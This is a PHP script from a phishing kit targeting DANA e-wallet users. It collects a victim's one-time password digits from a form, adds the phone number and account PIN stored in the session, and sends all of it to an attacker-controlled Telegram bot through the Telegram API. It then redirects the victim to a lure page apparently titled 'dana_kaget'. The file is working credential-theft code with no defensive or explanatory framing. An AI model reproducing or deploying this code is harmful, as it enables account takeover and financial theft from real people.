<?php

session_start();
include "./telegram.php";

$otp1 = $_POST['otp1'];
$otp2 = $_POST['otp2'];
$otp3 = $_POST['otp3'];
$otp4 = $_POST['otp4'];
$_otp = $otp1.$otp2.$otp3.$otp4;
$phone_number        = $_SESSION['phoneNumber'];
$_pin                = $_SESSION['acc_pin'];

$message = "
──────────────────────
DANA | OTP | ".$phone_number."
──────────────────────
• No HP : ".$phone_number."
• PIN AKUN : ".$_pin."
• OTP : ".$_otp."
──────────────────────";

function sendMessage($telegram_id, $message, $id_bot) {
    $url = "https://api.telegram.org/bot" . $id_bot . "/sendMessage?parse_mode=markdown&chat_id=" . $telegram_id;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}

sendMessage($telegram_id, $message, $id_bot);
header('Location: ./../dana_kaget/danaid/');
?>
